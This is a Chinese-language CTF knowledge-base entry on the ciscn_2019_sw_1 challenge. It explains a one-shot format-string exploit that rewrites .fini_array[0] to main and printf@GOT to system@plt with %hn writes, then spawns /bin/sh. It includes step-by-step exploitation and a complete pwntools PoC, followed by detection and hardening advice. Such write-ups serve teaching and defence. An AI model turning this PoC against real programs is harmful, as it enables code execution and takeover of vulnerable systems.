---
id: binary-pwn-format-string-single-shot-fini-array-restart-got-system-plt
title: 单次栈上格式化字符串双目标写：把 .fini_array[0] 改成 main 制造第二次执行窗口，同时将 printf GOT 覆写为 system@plt（无 libc 泄露）
type: scenario
domain: binary
path: binary/pwn/format-string
technique: format-string-single-shot-fini-array-restart-got-overwrite
tags:
- binary
- pwn
- format-string
- fini-array
- got
- hn
- plt
- partial-relro
- one-shot
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V473
  verified_at: '2026-11-10T16:36:42+08:00'
  notes: 已对照原文13690及17张图核对：checksec、fini_array@0x0804979C、main@0x08048534、四地址+%4..%7计数链与原文exp一致；high半字相同(0x0804)复用计数成立；未在本机复跑，原文未展示本题成功shell截图
url: /docs/binary/pwn/format-string/binary-pwn-format-string-single-shot-fini-array-restart-got-system-plt/
draft: false
kb_aliases:
- 格式化字符串 fini_array 重启
- fini_array 改 main 二次执行
- 单次格式化字符串双写 GOT 与 fini_array
- printf GOT 改 system@plt
- 一次 printf 写两处
- ciscn_2019_sw_1
---

## 一句话结论

当程序只有一次 `printf(用户输入)` 机会、但输入缓冲区就在栈上（地址可作为位置参数被 `%k$hn` 引用）时，可用同一条格式串完成两处 2 字节写：把 `.fini_array[0]` 的高低半字改成 `main`，让 main 返回后经 `fini_array` 再次进入 main 获得第二次输入；同时把 `printf@got` 的高低半字改成 `system@plt`（`system` 已被程序引用，PLT 地址固定，无需泄露 libc）。第二次 main 读入 `"/bin/sh"` 后，`printf("/bin/sh")` 实际执行 `system("/bin/sh")` 拿到 shell。

## 原理

- **一次机会与二次执行**：程序 `main` 里只有 `scanf("%64s", &format); printf("Hello "); printf(&format);`，漏洞点只触发一次。但 ELF 退出流程在 main 返回后会遍历 `.fini_array` 里的函数指针逐个调用（No/Partial RELRO 下该数组可写），因此把 `.fini_array[0]` 写成 `main` 的地址，程序正常返回后就会再次执行 main，攻击者获得第二轮输入。
- **为什么第二轮就能命令执行**：第一轮同时把 `printf@got` 写成 `system@plt`。第二轮 main 执行到 `printf(&format)` 时，实际调用的是 `system`，而 `&format` 正是刚读入的字符串 `"/bin/sh"`，于是执行 `system("/bin/sh")`。第二轮中更早的 `printf("Hello ")` 也会走被改写的 GOT，即 `system("Hello ")`，只是执行一条无害命令，不影响后续。
- **无需泄露 libc**：`system` 在二进制中已被某函数（后门 `_sys`）引用，存在 `system@plt` 且地址固定（No PIE），直接写 PLT 地址即可；这回避了先泄露 libc 再算 system 的步骤。
- **一条格式串写四个半字**：把四个 4 字节地址依次放在输入缓冲区开头（`fini_array+2`、`printf_got+2`、`printf_got`、`fini_array`），它们占据 printf 的第 4/5/6/7 个参数槽（gdb 实测本样本格式串首地址为第 4 个参数）。随后用 `%4$hn`～`%7$hn` 分四次写 2 字节：
  1. 先写 `fini_array+2` 得 `main>>16`，同时把输出计数推到该值；
  2. 用 `%5$hn` 把同一计数写进 `printf_got+2`——成立的前提是 `main>>16 == system@plt>>16 == 0x0804`；
  3. 补足差值后 `%6$hn` 写 `printf_got` 得 `system@plt & 0xffff`；
  4. 再补差值 `%7$hn` 写 `fini_array` 得 `main & 0xffff`。
- **计数校准**：`%n`/`%hn` 写入的是"已输出字符数"，四个地址本身先输出 16 字节，所以第一个 `%c` 的填充量要减去 0x10；后续每段的填充量都是"目标值 − 当前计数"，顺序必须保证计数单调递增，否则需要按 0x10000 取模绕回。
- **为什么选择高低半字顺序**：先把两个目标的高半字写成同一个值（0x0804），可以省掉一次大填充；再把低半字按递增顺序写。若两个目标高半字不同，则需增加一次写或调整顺序。

## 触发条件

- 存在 `printf(用户输入)` 等格式化字符串漏洞，且格式串缓冲区位于栈上，payload 里追加的地址能被 `%k$hn` 按位置参数索引到。
- 二进制为 32 位、No PIE（或已泄露代码基址）、No/Partial RELRO（`.fini_array` 与 GOT 可写）。
- 程序本身已引用 `system`（存在 `system@plt`），或已泄露 libc 可自行计算 system 地址。
- 目标函数（main 或调用漏洞函数的地址）固定，且 `.fini_array` 在退出时会被执行（常规 glibc 退出流程）。
- 只有一次格式化字符串触发机会，但需要在同一次调用内完成"续命 + 劫持"两件事。

## 利用步骤

1. `checksec` 确认 32 位、No PIE、No/Partial RELRO、NX；IDA/反汇编确认只有一次 `printf(&format)` 且 `system` 已被引用（有 `system@plt`）。
2. gdb 在 `printf(&format)` 处断点，确定格式串首地址在第 4 个参数（本样本），并记下输入缓冲区布局。
3. 从节头/符号取 `.fini_array` 地址（本样本 0x0804979C）、`printf@got` 地址、`main` 地址、`system@plt` 地址。
4. 按"四个地址 + 四段填充/`%hn`"构造 payload：先写两个高半字（相同值），再依次写 `system` 低半字、`main` 低半字；第一段填充扣除 16 字节地址。
5. 发送 payload，等待 main 返回并经 `.fini_array` 再次进入 main。
6. 第二轮输入 `"/bin/sh"`，`printf("/bin/sh")` 经被覆写的 GOT 执行 `system("/bin/sh")`，取得 shell。
7. 若第二次 main 的输入提示顺序有变化，按实际提示用 `sendlineafter` 对齐；地址/偏移随样本变化需重新调试。

## PoC

```python
from pwn import *

context(os='linux', arch='i386')
io = process('./ciscn_2019_sw_1')
elf = ELF('./ciscn_2019_sw_1')

printf_got = elf.got['printf']
system_plt = elf.plt['system']
fini_array = 0x0804979C          # 本样本 .fini_array[0]
main_addr  = 0x08048534          # 本样本 main

sys_hi, sys_lo = (system_plt >> 16) & 0xffff, system_plt & 0xffff
main_hi, main_lo = (main_addr >> 16) & 0xffff, main_addr & 0xffff
assert main_hi == sys_hi          # 高半字相同才能复用同一计数

payload  = p32(fini_array + 2) + p32(printf_got + 2)
payload += p32(printf_got) + p32(fini_array)
payload += b'%' + str(main_hi - 0x10).encode() + b'c%4$hn'   # fini_array+2 = main_hi
payload += b'%5$hn'                                           # printf_got+2 = main_hi
payload += b'%' + str(sys_lo - main_hi).encode() + b'c%6$hn'  # printf_got = sys_lo
payload += b'%' + str(main_lo - sys_lo).encode() + b'c%7$hn'  # fini_array = main_lo

io.sendlineafter(b"Welcome to my ctf! What's your name?", payload)
io.sendlineafter(b"Welcome to my ctf! What's your name?", b'/bin/sh')
io.interactive()
```

说明：参数索引 4～7、`fini_array`/`main`/`system@plt` 地址均为该样本的实测值；原文未在本机复跑，其余二进制需重新调试偏移与索引。

## 变体与关联

- 变体：若 `main>>16 != system@plt>>16`，增加一次 `%hn` 或调整写入顺序，用 `%<delta>c` 补差值。
- 变体：重启锚点除 `.fini_array[0]` 外，还可用 `.fini_array[1]`、`DT_FINI`、`__libc_csu_fini`、`atexit` 链；不同 glibc/链接方式可用锚点不同。
- 变体：若 `system` 未被引用、没有 PLT 项，则先泄露 libc（`%k$s` 读 GOT）再写真实 system 地址；64 位样本需改用 8 字节地址对齐与更低/更高分段的 `%hn`/`%hhn`。
- 关联：[[binary-pwn-format-string-got-hijack]]（单纯 GOT 覆写，无续命）、[[binary-pwn-format-string-non-stack-fini-array-loop-write]]（非栈上格式串借 fini_array 多轮重启，属于另一触发条件与 PoC）、[[binary-pwn-format-string-one-shot-stack-return-address-two-n-writes]]（单次机会两次写栈返回地址）、[[binary-pwn-format-string-single-shot-dual-write-hhn-low-byte-trampoline]]（单次双写但走跳板 + %hhn 尾字节）。
- 边界：Full RELRO 使 GOT/`.fini_array` 只读；PIE 使地址未知；`_FORTIFY_SOURCE`/`-Wformat-security` 阻断 `printf(buf)`；`.fini_array` 被清空/不可写时需换重启锚点。

## 检测与防御

- 检测：输入中出现多个 `%<数字>c` 与 `%k$hn` 组合；`.fini_array`/GOT 在运行期被改写；进程反复重启 main 的异常执行流；`printf` 调用点跳到 `system` 后出现子进程 `sh`。
- 修复：格式化输出一律改为 `printf("%s", buf)`；编译加 `-Wformat-security -Werror=format-security` 与 `-D_FORTIFY_SOURCE=2`。
- 加固：Full RELRO + BIND_NOW 使 GOT/`.fini_array` 只读；PIE + ASLR 提高地址预测难度；启用 Canary/NX/CET 作纵深防御。
